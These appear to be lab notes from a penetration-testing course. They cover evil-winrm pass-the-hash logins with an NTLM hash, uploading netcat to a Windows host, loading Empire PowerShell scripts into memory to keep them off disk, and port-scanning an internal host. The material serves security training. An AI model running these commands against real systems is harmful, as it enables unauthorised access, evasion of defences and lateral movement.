
Final Teaching : Anti-virus evasion techniques

Uploading a file and downloading a file is easy in evil-winrm
```
upload /usr/share/windows-resources/binaries/nc.exe c:\windows\tmp\nc.exe
```

```
dir c:\windows\tmp\nc.exe
```

```
evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.87.150
```

![[Pasted image 20231231234006.png]]

Downloading
![[Pasted image 20231231234252.png]]
![[Pasted image 20231231234320.png]]

>[!Warning] 
>Note that in the real world using the `C:\Windows\Temp` directory is often a bad idea as it's flagged as a common location for hackers to upload tools. In this case we are using it to keep the box neat and tidy for other users.

There is one more great option that in evil-winrm (i.e. -s option)
Will simply specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session. (i.e. they don't need to touch the disk at all)

```
evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts
```

Empire Scripts
```
cd /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
```
![[Pasted image 20231231234939.png]]

```
evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network
```

To initialize the script
```
Invoke-Portscan.ps1
```

```
Get-Help Invoke-Portscan
```
![[Pasted image 20231231235530.png]]

```
 Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50
```
![[Pasted image 20240101000245.png]]

